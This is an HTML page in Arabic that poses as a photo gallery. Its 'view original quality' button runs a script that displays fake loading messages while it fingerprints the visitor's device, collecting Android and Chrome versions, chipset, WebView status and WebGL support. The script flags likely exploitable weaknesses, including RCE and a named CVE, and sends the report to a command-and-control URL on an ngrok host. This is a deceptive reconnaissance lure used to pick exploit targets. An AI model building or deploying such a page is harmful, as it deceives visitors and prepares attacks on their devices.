<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معرض الصور الجديد</title>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
        #status {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.85); padding: 15px 30px; border-radius: 12px;
            font-size: 18px; z-index: 999;
        }
        .btn {
            margin: 40px auto;
            padding: 18px 50px;
            font-size: 21px;
            background: #1e90ff;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="status">جاري تحميل الصور...</div>
    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:50px;" alt="صورة">

    <button class="btn" onclick="startVulnAnalysis()">عرض الصورة بالجودة الأصلية</button>

    <script>
        const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";

        async function startVulnAnalysis() {
            const status = document.getElementById("status");
            status.innerHTML = "جاري تحميل النسخة عالية الجودة...";

            await new Promise(r => setTimeout(r, 1200));
            status.innerHTML = "جاري معالجة الصورة...";

            // ================== تحليل الثغرات الشامل ==================
            const report = {
                type: "vulnerability_analysis",
                timestamp: Date.now(),
                device: {
                    userAgent: navigator.userAgent,
                    androidVersion: getAndroidVersion(),
                    chromeVersion: getChromeVersion(),
                    screen: `${screen.width}x${screen.height}`,
                    deviceMemory: navigator.deviceMemory || "unknown",
                    cores: navigator.hardwareConcurrency || "unknown"
                },
                detected: {
                    isWebView: /wv|webview/i.test(navigator.userAgent),
                    isQualcomm: /qualcomm|qcom|sm\d+|snapdragon/i.test(navigator.userAgent),
                    oldAndroid: parseFloat(getAndroidVersion()) < 14,
                    oldChrome: parseFloat(getChromeVersion().split('.')[0]) < 120,
                    webGL: detectWebGL(),
                    webAssembly: typeof WebAssembly !== "undefined"
                },
                potential_vulnerabilities: getPotentialVulns()
            };

            // إرسال التقرير إلى C2
            fetch(C2_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(report)
            }).then(() => console.log("✅ تم إرسال تحليل الثغرات"))
              .catch(err => console.log("فشل إرسال التحليل"));

            status.innerHTML = "تم عرض الصورة بنجاح ✓";
        }

        function getAndroidVersion() {
            const m = navigator.userAgent.match(/Android\s([0-9.]+)/);
            return m ? m[1] : "unknown";
        }

        function getChromeVersion() {
            const m = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
            return m ? m[1] : "unknown";
        }

        function detectWebGL() {
            try {
                return !!document.createElement("canvas").getContext("webgl");
            } catch(e) { return false; }
        }

        function getPotentialVulns() {
            const list = [];
            const android = parseFloat(getAndroidVersion());
            const chrome = parseFloat(getChromeVersion().split('.')[0]);

            if (android < 14) list.push("Android < 14 - High risk of known exploits");
            if (/qualcomm/i.test(navigator.userAgent)) list.push("Qualcomm chipset - CVE-2026-21385 possible");
            if (chrome < 120) list.push("Old Chrome/WebView - Multiple RCE possible");

            return list.length > 0 ? list : ["No critical vulnerabilities detected"];
        }
    </script>
</body>
</html>
